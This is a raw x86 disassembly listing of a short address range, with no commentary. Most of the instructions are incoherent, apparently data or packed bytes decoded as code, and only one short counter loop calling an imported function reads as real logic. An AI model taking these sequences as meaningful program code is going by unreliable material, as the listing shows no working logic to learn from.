  409f43:	cmovb  edi,DWORD PTR [esi+0x2f]
  409f47:	mov    DWORD PTR [eax+ebp*8-0x8fa2fc7],ebp
  409f4e:	inc    ebp
  409f4f:	ficom  WORD PTR [eax+0x5f]
  409f52:	cwde   
  409f53:	retf   0x8f71
  409f56:	setbe  BYTE PTR [ebp-0x9]
  409f5a:	and    BYTE PTR [ebp-0x3f248a5b],bh
  409f60:	xchg   cl,bh
  409f62:	out    dx,al
  409f63:	mov    dl,0x2c
  409f65:	lods   ax,WORD PTR ds:[esi]
  409f67:	jo     0x409f7a
  409f69:	leave  
  409f6a:	lods   al,BYTE PTR ds:[esi]
  409f6b:	iret   
  409f6c:	(bad)  
  409f6d:	scas   al,BYTE PTR es:[edi]
  409f6e:	push   ds
  409f6f:	pop    edi
  409f70:	dec    edi
  409f71:	rol    BYTE PTR [ebx+0xc74122d],1
  409f77:	adc    BYTE PTR [edi+edi*2+0x3],ah
  409f7b:	pop    esp
  409f7c:	(bad)  
  409f7d:	enter  0xdaca,0xf
  409f81:	test   DWORD PTR [esi+eax*8-0x75505f89],eax
  409f88:	jmp    0x1150:0x846c633
  409f8f:	outs   dx,DWORD PTR ds:[esi]
  409f90:	mov    ah,0x53
  409f92:	mov    eax,ds:0x5d11593f
  409f97:	adc    DWORD PTR [edx],ebx
  409f99:	sbb    dl,al
  409f9b:	pusha  
  409f9c:	sbb    ecx,eax
  409f9e:	push   ebp
  409f9f:	sbb    dh,BYTE PTR [ebp+0x19]
  409fa2:	sbb    al,0xb2
  409fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fa5:	fcomip st,st(4)
  409fa7:	dec    esp
  409fa8:	fisubr WORD PTR [ecx+eax*4-0x60]
  409fac:	sbb    esp,ebx
  409fae:	cmp    edi,0xd31e2f84
  409fb4:	rcr    BYTE PTR [edx],1
  409fb6:	and    esp,DWORD PTR [ecx+0x7dfa4885]
  409fbc:	stos   DWORD PTR es:[edi],eax
  409fbd:	cmp    al,0x75
  409fbf:	aas    
  409fc0:	jo     0x409f4c
  409fc2:	cmp    eax,0x7f6d024f
  409fc7:	popa   
  409fc8:	in     al,dx
  409fc9:	fwait
  409fca:	cmp    al,0x67
  409fcc:	(bad)  
  409fcd:	test   al,0x41
  409fcf:	push   cs
  409fd0:	repnz fisub WORD PTR [edi]
  409fd3:	xchg   edi,eax
  409fd4:	call   0x766404c1
  409fd9:	xchg   ebp,eax
  409fda:	ja     0x40a02d
  409fdc:	dec    ebp
  409fdd:	or     DWORD PTR [ebx+0x572bff55],esi
  409fe3:	fimul  WORD PTR [eax-0x73e4bafe]
  409fe9:	fs pop ebp
  409feb:	gs or  eax,0xcea5d48b
  409ff1:	sub    BYTE PTR [edi+0x7c7ad09e],dl
  409ff7:	into   
  409ff8:	mov    ds,WORD PTR [edi-0x35]
  409ffb:	ins    BYTE PTR es:[edi],dx
  409ffc:	push   ecx
  409ffd:	pop    ecx
  409ffe:	inc    esp
  409fff:	lods   al,BYTE PTR ds:[esi]
  40a000:	cmova  edx,ebx
  40a003:	(bad)  
  40a004:	jnp    0x409fda
  40a006:	out    0x5f,eax
  40a008:	xchg   BYTE PTR [ebx+eax*1+0x24e6385b],dh
  40a00f:	and    edx,DWORD PTR [edi]
  40a011:	xor    ah,bh
  40a013:	pop    ss
  40a014:	ficomp WORD PTR [ebp-0x185856d0]
  40a01a:	jecxz  0x409fb2
  40a01c:	jae    0x409fad
  40a01e:	sbb    eax,edx
  40a020:	mov    eax,0x9f964cfd
  40a025:	in     eax,0xe5
  40a027:	cmp    bp,ax
  40a02a:	retf   0xb87a
  40a02d:	and    BYTE PTR [edx+0x63],dh
  40a030:	or     ebx,esi
  40a032:	out    0x17,eax
  40a034:	je     0x40a0a8
  40a036:	je     0x40a06f
  40a038:	imul   eax,DWORD PTR [ecx+eiz*4+0x34b6369f],0x39
  40a040:	arpl   WORD PTR [ebx],bx
  40a042:	ins    BYTE PTR es:[edi],dx
  40a043:	sub    eax,0x9ad97656
  40a048:	stos   DWORD PTR es:[edi],eax
  40a049:	adc    BYTE PTR [edx+0x43],ch
  40a04c:	jmp    0x40a0cc
  40a04e:	add    eax,DWORD PTR [ebp+0x48b3fa76]
  40a054:	ret    0xc14d
  40a057:	outs   dx,BYTE PTR ds:[esi]
  40a058:	jmp    0x4f6cb1b8
  40a05d:	cmp    BYTE PTR [edi],0x9e
  40a060:	test   BYTE PTR [esi-0x4d251287],al
  40a066:	jp     0x40a03c
  40a068:	mov    dh,0x7f
  40a06a:	hlt    
  40a06b:	jo     0x40a046
  40a06d:	cmc    
  40a06e:	pop    ds
  40a06f:	push   0x61
  40a071:	sbb    al,0x2a
  40a073:	sar    DWORD PTR [ecx-0x12a295fb],1
  40a079:	sub    DWORD PTR [edi+ebx*4],edx
  40a07c:	dec    ebp
  40a07d:	pop    ebp
  40a07e:	test   DWORD PTR [esi+0x5c],ebp
  40a081:	jmp    0xcce38b61
  40a086:	push   es
  40a087:	push   ecx
  40a088:	xchg   DWORD PTR [ebp-0x60cb00e2],ebp
  40a08e:	in     eax,dx
  40a08f:	inc    ebx
  40a090:	int3   
  40a091:	mov    WORD PTR [ebx],ss
  40a093:	mov    eax,0xd6061d94
  40a098:	ret    0x3c4d
  40a09b:	aam    0xae
  40a09d:	fisubr DWORD PTR [edi-0x53]
  40a0a0:	outs   dx,BYTE PTR ds:[esi]
  40a0a1:	add    eax,0x1b7ae671
  40a0a6:	mov    ss,WORD PTR [edx-0x5a]
  40a0a9:	xchg   DWORD PTR [ebp+ecx*2-0x4c],ebx
  40a0ad:	push   ss
  40a0ae:	and    al,BYTE PTR [ebx]
  40a0b0:	inc    esi
  40a0b1:	jbe    0x40a105
  40a0b3:	mov    ch,0x7b
  40a0b5:	xchg   edx,eax
  40a0b6:	sar    DWORD PTR [ebx+eiz*8+0x4e412466],0x3d
  40a0be:	xor    edx,DWORD PTR [ebx+0x63ebb6e9]
  40a0c4:	mov    es,WORD PTR [edx+0x58]
  40a0c7:	push   ss
  40a0c8:	xor    BYTE PTR [esi-0x4909becb],0xa8
  40a0cf:	call   0xe99e:0x5ff0a4b2
  40a0d6:	jmp    0x40a08d
  40a0d8:	dec    ecx
  40a0d9:	in     al,0x8d
  40a0db:	cmc    
  40a0dc:	repz shl esi,0x58
  40a0e0:	add    BYTE PTR [ebx-0x5a],0x4
  40a0e4:	imul   ah
  40a0e6:	sbb    BYTE PTR [esi+eax*2],bl
  40a0e9:	cld    
  40a0ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0eb:	add    BYTE PTR ds:0xf22d6590,0x8a
  40a0f2:	rol    DWORD PTR [ecx],cl
  40a0f4:	dec    ebx
  40a0f5:	dec    esi
  40a0f6:	and    BYTE PTR [ebp-0x3e],dh
  40a0f9:	push   esi
  40a0fa:	lods   al,BYTE PTR ds:[esi]
  40a0fb:	xchg   ebp,eax
  40a0fc:	retf   0x217a
  40a0ff:	cld    
  40a100:	push   DWORD PTR [edi]
  40a102:	add    BYTE PTR [ebx],dl
  40a104:	test   al,0xf7
  40a106:	cmc    
  40a107:	cld    
  40a108:	pushf  
  40a109:	iret   
  40a10a:	push   ecx
  40a10b:	xchg   ebx,eax
  40a10c:	bound  edx,QWORD PTR [eax]
  40a10e:	pop    ds
  40a10f:	rol    BYTE PTR ds:0xf4a9c3bc,0x90
  40a116:	dec    edi
  40a117:	rcl    BYTE PTR [ebx-0x1b93f2bc],1
  40a11d:	idiv   DWORD PTR [esi+edi*1]
  40a120:	mov    al,0x51
  40a122:	out    0x30,eax
  40a124:	jl     0x40a147
  40a126:	ins    BYTE PTR es:[edi],dx
  40a127:	(bad)  
  40a128:	sbb    BYTE PTR [edi+edx*4],bh
  40a12b:	jb     0x543d63c1
  40a131:	jnp    0x40a0ec
  40a133:	fiadd  DWORD PTR [ecx+eax*2-0x38]
  40a137:	retf   0xa41c
  40a13a:	xchg   ecx,eax
  40a13b:	push   ecx
  40a13c:	out    0xf2,eax
  40a13e:	jle    0x40a121
  40a140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a141:	add    BYTE PTR [ebp-0x43],ah
  40a144:	imul   ebp,DWORD PTR [edi-0xf],0xc9463aff
  40a14b:	loopne 0x40a18b
  40a14d:	fs mov dh,0x34
  40a150:	stos   BYTE PTR es:[edi],al
  40a151:	inc    ecx
  40a152:	sti    
  40a153:	fbstp  TBYTE PTR [esi]
  40a155:	test   DWORD PTR [ecx],edx
  40a157:	xchg   esi,eax
  40a158:	lahf   
  40a159:	sbb    ch,BYTE PTR [ebp-0x6746448b]
  40a15f:	lds    eax,FWORD PTR [ecx+0x67]
  40a162:	cmp    eax,0x33ecdbb4
  40a167:	(bad)  
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	mov    cl,0x47
  40a17b:	add    eax,0x7ee739b0
  40a180:	jle    0x40a1b0
  40a182:	jge    0x40a202
  40a184:	jle    0x40a152
  40a186:	mov    al,0x1
  40a188:	pop    ecx
  40a189:	dec    eax
  40a18a:	jae    0x40a12d
  40a18c:	mov    edx,0xe5cf5f9
  40a191:	dec    edi
  40a192:	popa   
  40a193:	cmc    
  40a194:	mov    dl,0x9e
  40a196:	mov    cl,0xca
  40a198:	mov    ds:0x250db73,al
  40a19d:	jo     0x40a159
  40a19f:	jb     0x40a191
  40a1a1:	add    al,0x66
  40a1a3:	pop    ds
  40a1a4:	push   ds
  40a1a5:	scas   al,BYTE PTR es:[edi]
  40a1a6:	(bad)  ds:0x52863418
  40a1ac:	fisub  WORD PTR [edi-0x75]
  40a1af:	int    0x31
  40a1b1:	push   edx
  40a1b2:	jb     0x40a181
  40a1b4:	inc    ecx
  40a1b5:	(bad)  
  40a1b6:	rcr    DWORD PTR [eax],1
  40a1b8:	or     al,0x3f
  40a1ba:	inc    ecx
  40a1bb:	shr    DWORD PTR ds:0x7b1137cf,1
  40a1c1:	(bad)  [ebx-0x244645ae]
  40a1c7:	mov    DWORD PTR [ebx-0x41bb17ad],ebp
  40a1cd:	and    ebp,DWORD PTR [edi+edx*4+0x24]
  40a1d1:	mov    esp,0x1aee45c3
  40a1d6:	sub    eax,0x74099448
  40a1db:	mov    edx,0xb2df4d80
  40a1e0:	cmp    edi,DWORD PTR [ecx+0x4b]
  40a1e3:	fwait
  40a1e4:	jg     0x40a190
  40a1e6:	idiv   BYTE PTR [esi]
  40a1e8:	mov    bh,0xdb
  40a1ea:	inc    ebp
  40a1eb:	mov    ds:0xc916f2aa,eax
  40a1f0:	arpl   WORD PTR [eax-0x1959da8],ax
  40a1f6:	ret    0x45ac
  40a1f9:	and    BYTE PTR [edx-0x520f2dc6],al
  40a1ff:	xchg   esp,eax
  40a200:	jmp    0x40a23b
  40a202:	cmp    al,0x42
  40a204:	mov    dl,0xa8
  40a206:	popf   
  40a207:	int3   
  40a208:	shl    bl,cl
  40a20a:	jns    0x40a195
  40a20c:	mov    eax,0x250a995f
  40a211:	inc    esi
  40a212:	pop    ebx
  40a213:	out    dx,al
  40a214:	cmp    BYTE PTR [esi+0x6ae3353e],al
  40a21a:	and    esi,DWORD PTR [edi+0x59ed3e6e]
  40a220:	dec    esp
  40a221:	hlt    
  40a222:	test   BYTE PTR [eax+0x13c5ca10],0x1f
  40a229:	push   ss
  40a22a:	ret    0xc9eb
  40a22d:	mov    eax,ds:0x456be56b
  40a232:	xchg   ebp,eax
  40a233:	(bad)  
  40a235:	push   esi
  40a236:	(bad)  
  40a237:	not    DWORD PTR [edi+0x2a8d8646]
  40a23d:	jle    0x40a27d
  40a23f:	jae    0x40a2a9
  40a241:	ret    0x24e5
  40a244:	or     DWORD PTR [edi-0x7dc899a4],ebx
  40a24a:	cmp    eax,0x3b96e196
  40a24f:	adc    bl,BYTE PTR [esp+eiz*2-0x34]
  40a253:	mov    ch,0x17
  40a255:	clc    
  40a256:	fdiv   st,st(0)
  40a258:	ins    DWORD PTR es:[edi],dx
  40a259:	jno    0x40a1de
  40a25b:	mov    gs,WORD PTR cs:[eax-0x39a23aed]
  40a262:	sahf   
  40a263:	ss mov ecx,0x8c3c759e
  40a269:	icebp  
  40a26a:	and    eax,0x47afa0ec
  40a26f:	mov    ebp,fs
  40a271:	mov    ds:0xd38c44fe,eax
  40a276:	and    DWORD PTR [esi],0xc7d10bc3
  40a27c:	jl     0x40a2f4
  40a27e:	sbb    DWORD PTR [ebx+0x6b],edx
  40a281:	cmp    eax,0xc71fc71f
  40a286:	dec    ecx
  40a287:	mov    bh,0x68
  40a289:	rol    ebp,1
  40a28b:	aad    0x88
  40a28d:	repz dec ebx
  40a28f:	jp     0x40a2a0
  40a291:	push   cs
  40a292:	xchg   edx,eax
  40a293:	inc    ecx
  40a294:	adc    eax,0xa7206be2
  40a299:	xor    ch,bl
  40a29b:	fdivr  DWORD PTR [esi]
  40a29d:	xlat   BYTE PTR ds:[ebx]
  40a29e:	repz jge 0x40a2f2
  40a2a1:	pop    ecx
  40a2a2:	ror    DWORD PTR [ebp+0x34],1
  40a2a5:	dec    edx
  40a2a6:	loope  0x40a2ff
  40a2a8:	(bad)  
  40a2a9:	fcmovu st,st(3)
  40a2ab:	jnp    0x40a2b7
  40a2ad:	mov    cl,0xfb
  40a2af:	call   0x5d48:0xc6252ae9
  40a2b6:	mov    eax,ds:0xea4cf3f0
  40a2bb:	outs   dx,DWORD PTR ds:[esi]
  40a2bc:	hlt    
  40a2bd:	jns    0x40a241
  40a2bf:	or     edi,DWORD PTR [esi+0x18]
  40a2c2:	push   ds
  40a2c3:	cmp    bh,al
  40a2c5:	cmp    DWORD PTR [bp-0x73],esi
  40a2c9:	popf   
  40a2ca:	(bad)  
  40a2cb:	test   al,0xc5
  40a2cd:	cmp    edx,DWORD PTR [eax]
  40a2cf:	mov    WORD PTR [ebx+0x196a5018],ds
  40a2d5:	xchg   edi,eax
  40a2d6:	dec    edi
  40a2d7:	mov    edi,0x39409cfd
  40a2dc:	sub    al,0xc0
  40a2de:	mov    ds:0x26fad41f,eax
  40a2e3:	(bad)  
  40a2e4:	das    
  40a2e5:	xchg   ebx,eax
  40a2e6:	mov    edx,0x4d7739f9
  40a2eb:	mov    dl,0xcd
  40a2ed:	mov    edi,DWORD PTR [edi-0x38ce8650]
  40a2f3:	sar    DWORD PTR [eax],0xfe
  40a2f6:	mov    BYTE PTR [esi],bl
  40a2f8:	out    0x71,al
  40a2fa:	(bad)  
  40a2fb:	cld    
  40a2fc:	sbb    ecx,eax
  40a2fe:	mov    eax,ds:0xca1759a5
  40a303:	cli    
  40a304:	stos   BYTE PTR es:[edi],al
  40a305:	sahf   
  40a306:	add    al,0x13
  40a308:	pop    ecx
  40a309:	rcl    edi,1
  40a30b:	aad    0x81
  40a30d:	and    cl,BYTE PTR [ebx-0x7feb9b5a]
  40a313:	xor    eax,0xc930dfbf
  40a318:	retf   
  40a319:	jge    0x40a354
  40a31b:	xlat   BYTE PTR ds:[ebx]
  40a31c:	sbb    BYTE PTR [eax],0x3b
  40a31f:	pop    esp
  40a320:	lods   al,BYTE PTR ds:[esi]
  40a321:	(bad)  
  40a322:	imul   esp,DWORD PTR [edi-0x1038e139],0x1d8aaf19
  40a32c:	and    ah,bh
  40a32e:	(bad)  
  40a330:	xchg   esp,eax
  40a331:	inc    ebx
  40a332:	mov    edi,0xcce73472
  40a337:	or     ecx,DWORD PTR [edx]
  40a339:	mov    edx,ebx
  40a33b:	rdmsr  
  40a33d:	and    esi,ebx
  40a33f:	aam    0x70
  40a341:	pop    edi
  40a342:	jl     0x40a345
  40a344:	(bad)  
  40a345:	fstp   DWORD PTR [esi]
  40a347:	or     edx,DWORD PTR [ebp+ebx*8-0x17519b4]
  40a34e:	sbb    dl,dl
  40a350:	mov    eax,0xf600b482
  40a355:	cmc    
  40a356:	outs   dx,BYTE PTR ds:[esi]
  40a357:	xlat   BYTE PTR ds:[ebx]
  40a358:	add    DWORD PTR [ebp+0x270f6f99],esi
  40a35e:	stos   BYTE PTR es:[edi],al
  40a35f:	adc    al,0xb7
  40a361:	push   ds
  40a362:	mov    ah,0xf4
  40a364:	jmp    0x40a3b3
  40a366:	cs cmp al,0x3f
  40a369:	mov    al,0x3b
  40a36b:	inc    ecx
  40a36c:	dec    edx
  40a36d:	mov    bl,0xa8
  40a36f:	loop   0x40a3bf
  40a371:	push   edi
  40a372:	cld    
  40a373:	dec    esp
  40a374:	outs   dx,DWORD PTR ds:[esi]
  40a375:	xchg   DWORD PTR [ebx-0x52],esi
  40a378:	scas   eax,DWORD PTR es:[edi]
  40a379:	mov    edx,DWORD PTR [ecx-0x2b]
  40a37c:	in     eax,0x6d
  40a37e:	jns    0x40a3c3
  40a380:	cmp    cl,BYTE PTR [eax+0x3c]
  40a383:	fimul  DWORD PTR [eax]
  40a385:	xor    BYTE PTR [edx+0x31c4bd5d],dh
  40a38b:	push   cs
  40a38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a38d:	fistp  WORD PTR [edx-0xc209e85]
  40a393:	pop    es
  40a394:	stos   BYTE PTR es:[edi],al
  40a395:	fdivr  QWORD PTR [eax]
  40a397:	and    al,0x24
  40a399:	mov    eax,ds:0x745fb65f
  40a39e:	fist   DWORD PTR ds:0xced3792c
  40a3a4:	or     bl,cl
  40a3a6:	mov    dl,0xb4
  40a3a8:	fnstsw WORD PTR [esi]
  40a3aa:	cmp    DWORD PTR ds:0x938f17c3,esi
  40a3b0:	add    BYTE PTR [eax-0x277926d2],0xe7
  40a3b7:	mov    dh,0xa
  40a3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3bb:	ins    DWORD PTR es:[edi],dx
  40a3bc:	rcl    BYTE PTR [edx+0x56],cl
  40a3bf:	mov    BYTE PTR [ebp-0x7c],dh
  40a3c2:	aas    
  40a3c3:	ror    DWORD PTR [edi],0x24
  40a3c6:	enter  0xb3d4,0xa1
  40a3ca:	lods   eax,DWORD PTR ds:[esi]
  40a3cb:	stos   BYTE PTR es:[edi],al
  40a3cc:	lahf   
  40a3cd:	mov    ah,0x63
  40a3cf:	rol    bl,0xf5
  40a3d2:	or     BYTE PTR [esp+ebp*4+0x6327c994],0xdc
  40a3da:	lea    ebx,[eax-0x5d]
  40a3dd:	gs das 
  40a3df:	call   0x5dc8:0x7a72eb0a
  40a3e6:	ret    0xb353
  40a3e9:	or     eax,eax
  40a3eb:	mov    bl,0x12
  40a3ed:	or     esp,DWORD PTR [ecx]
  40a3ef:	ja     0x40a44e
  40a3f1:	or     cl,bl
  40a3f3:	dec    esp
  40a3f4:	cld    
  40a3f5:	les    edx,FWORD PTR [ebp-0x7e77ade7]
  40a3fb:	sbb    eax,0xeb68e30d
  40a400:	jo     0x40a431
  40a402:	lahf   
  40a403:	inc    eax
  40a404:	std    
  40a405:	jns    0x40a426
  40a407:	xchg   BYTE PTR [edx+0x74],ch
  40a40a:	call   0x1577:0x7bdf82d4
  40a411:	sbb    esi,DWORD PTR [esp+ecx*1-0x277a31eb]
  40a418:	fwait
  40a419:	ret    
  40a41a:	lods   eax,DWORD PTR ds:[esi]
  40a41b:	das    
  40a41c:	dec    esi
  40a41d:	iret   
  40a41e:	adc    ch,BYTE PTR [eax]
  40a420:	data16 data16 aaa 
  40a423:	add    eax,edi
  40a425:	xor    eax,ebx
  40a427:	imul   esi,DWORD PTR ds:0x6fe569fb,0xba9ae5ef
  40a431:	push   0xffffffd9
  40a433:	arpl   WORD PTR [ecx],si
  40a435:	sar    DWORD PTR [ecx+0x2c2db0c6],1
  40a43b:	jb     0x40a3d2
  40a43d:	cmp    cl,al
  40a43f:	rcl    BYTE PTR [ecx+0x22d4d397],0x7a
  40a446:	jge    0x40a487
  40a448:	jecxz  0x40a474
  40a44a:	int    0x0
  40a44c:	inc    esp
  40a44d:	loopne 0x40a45d
  40a44f:	(bad)  
  40a450:	in     eax,dx
  40a451:	mov    eax,0x7513c934
  40a456:	dec    ecx
  40a457:	add    DWORD PTR [ecx],ebp
  40a459:	jl     0x40a45e
  40a45b:	xchg   dh,bh
  40a45d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a45e:	pop    ebx
  40a45f:	nop    DWORD PTR [esi]
  40a462:	or     al,BYTE PTR [edi]
  40a464:	and    DWORD PTR [ebp-0x14],ecx
  40a467:	pop    es
  40a468:	in     al,dx
  40a469:	(bad)  
  40a46a:	jmp    0x5235:0xd1387e36
  40a471:	xchg   esi,eax
  40a472:	push   ebp
  40a473:	mov    ds:0x998d86ef,al
  40a478:	arpl   WORD PTR [ebx+0x4e],dx
  40a47b:	lock jecxz 0x40a47b
  40a47e:	adc    eax,0x4f22bdc7
  40a483:	ror    BYTE PTR [ebx+0x180ca397],cl
  40a489:	lahf   
  40a48a:	out    0x75,eax
  40a48c:	int3   
  40a48d:	push   ebx
  40a48e:	xor    al,0xc1
  40a490:	js     0x40a491
  40a492:	loope  0x40a4fd
  40a494:	je     0x40a4bc
  40a496:	adc    eax,0xa29b890a
  40a49b:	jmp    0xe648:0x2b0c87eb
  40a4a2:	popa   
  40a4a3:	sub    ch,bl
  40a4a5:	mov    al,0x7c
  40a4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4a8:	aaa    
  40a4a9:	sub    BYTE PTR [ebx+0x54],al
  40a4ac:	dec    edi
  40a4ad:	mov    edi,0x96c94ae
  40a4b2:	mov    edx,0xc7039e12
  40a4b7:	and    DWORD PTR ds:0x4302f1,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss xchg ecx,eax
  40a512:	ins    DWORD PTR es:[edi],dx
  40a513:	cmp    al,0x23
  40a515:	jmp    0x2ebf23fc
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a4ae
  40a51e:	test   al,0xf7
  40a520:	daa    
  40a521:	xor    esi,ecx
  40a523:	or     al,0xca
  40a525:	jae    0x40a556
  40a527:	dec    edi
  40a528:	stc    
  40a529:	rcr    BYTE PTR [edi],0x76
  40a52c:	xor    edx,DWORD PTR [ecx]
  40a52e:	sub    eax,0xe8951784
  40a533:	jp     0x40a504
  40a535:	push   edi
  40a536:	das    
  40a537:	out    0x4d,al
  40a539:	sub    ebp,0x4c
  40a53c:	push   ecx
  40a53d:	xor    edx,DWORD PTR [ebx-0x11]
  40a540:	jge    0x40a4e2
  40a542:	lds    ebp,FWORD PTR [edx]
  40a544:	hlt    
  40a545:	adc    edi,DWORD PTR ds:0xb9871bc8
  40a54b:	jb     0x40a5af
  40a54d:	cli    
  40a54e:	les    edx,FWORD PTR [ebp-0x32]
  40a551:	je     0x40a51e
  40a553:	(bad)  
  40a554:	mov    cl,BYTE PTR [edx]
  40a556:	pcmpeqd mm4,mm2
  40a559:	mov    ah,0xa6
  40a55b:	sbb    esp,esp
  40a55d:	sbb    al,bh
  40a55f:	inc    edi
  40a560:	sar    DWORD PTR [edi],cl
  40a562:	push   ebp
  40a563:	sbb    al,0x1f
  40a565:	push   ecx
  40a566:	sar    BYTE PTR [ebx+ebp*8],1
  40a569:	test   eax,0xd8144d96
  40a56e:	mov    dh,0xa8
  40a570:	push   esp
  40a571:	cwde   
  40a572:	mov    esp,0x32089dca
  40a577:	dec    edx
  40a578:	cli    
  40a579:	outs   dx,DWORD PTR ds:[esi]
  40a57a:	call   0x1a3a65f7
  40a57f:	ja     0x40a558
  40a581:	push   edx
  40a582:	push   0x2d
  40a584:	jb     0x92989dc9
  40a58a:	xchg   ecx,eax
  40a58b:	addr16 pop es
  40a58d:	push   esp
  40a58e:	or     al,0xe1
  40a590:	jnp    0x40a608
  40a592:	outs   dx,DWORD PTR ds:[esi]
  40a593:	inc    esp
  40a594:	pop    edi
  40a595:	aad    0x80
  40a597:	or     al,0x9c
  40a599:	or     BYTE PTR [ebx+eax*8-0x6b],bh
  40a59d:	sbb    esp,DWORD PTR [esi+0x20]
  40a5a0:	(bad)  
  40a5a2:	test   DWORD PTR [ecx+0x65],esp
  40a5a5:	in     al,dx
  40a5a6:	mov    ds:0x1ce0bd2b,al
  40a5ab:	xchg   edi,eax
  40a5ac:	or     ebp,ebx
  40a5ae:	cld    
  40a5af:	pop    ebx
  40a5b0:	push   eax
  40a5b1:	jnp    0x40a5e4
  40a5b3:	xchg   ebp,eax
  40a5b4:	test   eax,0xe6494572
  40a5b9:	jmp    0xae11f6bb
  40a5be:	inc    ecx
  40a5bf:	add    bl,al
  40a5c1:	test   DWORD PTR [esi+eiz*4+0x38],ebp
  40a5c5:	cwde   
  40a5c6:	xor    ebp,edi
  40a5c8:	dec    eax
  40a5c9:	ret    
  40a5ca:	loop   0x40a5a1
  40a5cc:	inc    edx
  40a5cd:	call   0xe253:0xfc986b89
  40a5d4:	nop
  40a5d5:	es in  eax,0xd9
  40a5d8:	pop    ss
  40a5d9:	call   0x9c85441a
  40a5de:	jg     0x40a647
  40a5e0:	xchg   esp,eax
  40a5e1:	xchg   esi,eax
  40a5e2:	cs ret 
  40a5e4:	imul   edx,esp,0x9a82af95
  40a5ea:	jmp    0x2a5cb664
  40a5ef:	and    DWORD PTR [ebx-0x51],eax
  40a5f2:	push   edx
  40a5f3:	xor    dh,BYTE PTR [ebx+0x24]
  40a5f6:	test   DWORD PTR [eax+edx*2+0x5e],eax
  40a5fa:	popf   
  40a5fb:	loopne 0x40a57d
  40a5fd:	ins    BYTE PTR es:[edi],dx
  40a5fe:	or     eax,0x1acb0b11
  40a603:	test   eax,0x9f4ca7b8
  40a608:	dec    edx
  40a609:	sbb    al,0x3e
  40a60b:	jb     0x40a5a7
  40a60d:	sti    
  40a60e:	xor    BYTE PTR [esi+0xbead9de],ch
  40a614:	pop    ds
  40a615:	push   ds
  40a616:	push   ds
  40a617:	sbb    ch,BYTE PTR [edi+edx*4-0x586fb7cc]
  40a61e:	mov    ch,0x5e
  40a620:	push   edi
  40a621:	nop    DWORD PTR [esi]
  40a624:	lods   al,BYTE PTR ds:[esi]
  40a625:	pop    edi
  40a626:	dec    edi
  40a627:	scas   al,BYTE PTR es:[edi]
  40a628:	mov    edx,0x62e4ce99
  40a62d:	test   DWORD PTR [ecx+0x19bac058],ecx
  40a633:	call   0xb336:0x89dc977c
  40a63a:	add    edx,esp
  40a63c:	in     al,0xbd
  40a63e:	fstp   QWORD PTR [ebp-0x5]
  40a641:	icebp  
  40a642:	ja     0x40a5d4
  40a644:	xchg   ecx,eax
  40a645:	pop    eax
  40a646:	int    0x3e
  40a648:	gs loopne 0x40a67b
  40a64b:	retf   0xd1fd
  40a64e:	mov    ss,WORD PTR gs:[ebx]
  40a651:	sub    al,0x58
  40a653:	dec    edx
  40a654:	xchg   ebp,eax
  40a655:	dec    ebx
  40a656:	fimul  WORD PTR [esi+0x2f6968b5]
  40a65c:	leave  
  40a65d:	mov    BYTE PTR [edx-0x34b6364e],al
  40a663:	or     eax,0xe04cf377
  40a668:	out    dx,eax
  40a669:	mov    gs,WORD PTR [esi-0x6a]
  40a66c:	call   0x36b57fb
  40a671:	pop    esi
  40a672:	sbb    esp,esi
  40a674:	lea    ebp,[edi-0x17db5a06]
  40a67a:	push   0x7832d599
  40a67f:	test   ah,bl
  40a681:	inc    ebx
  40a682:	in     al,dx
  40a683:	cmp    al,0x5
  40a685:	ret    
  40a686:	or     ebp,0xfbad5e4b
  40a68c:	adc    al,0xe0
  40a68e:	sbb    al,0x46
  40a690:	(bad)  
  40a691:	out    0x70,al
  40a693:	jl     0x40a618
  40a695:	imul   esi,eax,0xbe1bdb5e
  40a69b:	fdiv   DWORD PTR [edi+eax*4+0x67]
  40a69f:	cmp    eax,0x9d974de8
  40a6a4:	push   0x30
  40a6a6:	cwde   
  40a6a7:	stc    
  40a6a8:	push   esi
  40a6a9:	outs   dx,DWORD PTR ds:[esi]
  40a6aa:	mov    edx,0xc48b5606
  40a6af:	jmp    0x78e87bff
  40a6b4:	jle    0x40a70b
  40a6b6:	pop    ss
  40a6b7:	mov    eax,ds:0x64d236d3
  40a6bc:	push   ecx
  40a6bd:	js     0x40a67f
  40a6bf:	and    bh,BYTE PTR [ecx-0x33]
  40a6c2:	cdq    
  40a6c3:	xchg   ebp,eax
  40a6c4:	call   0x874c:0xe3c3b39d
  40a6cb:	mov    al,0x43
  40a6cd:	jns    0x40a70d
  40a6cf:	push   DWORD PTR [edi-0x63]
  40a6d2:	loop   0x40a6f2
  40a6d4:	mov    BYTE PTR [esi+0x32],dl
  40a6d7:	cmp    al,0xbe
  40a6d9:	and    bl,BYTE PTR [eax+0x7b]
  40a6dc:	xchg   edx,eax
  40a6dd:	scas   eax,DWORD PTR es:[edi]
  40a6de:	std    
  40a6df:	lock ss int 0x97
  40a6e3:	jo     0x40a69c
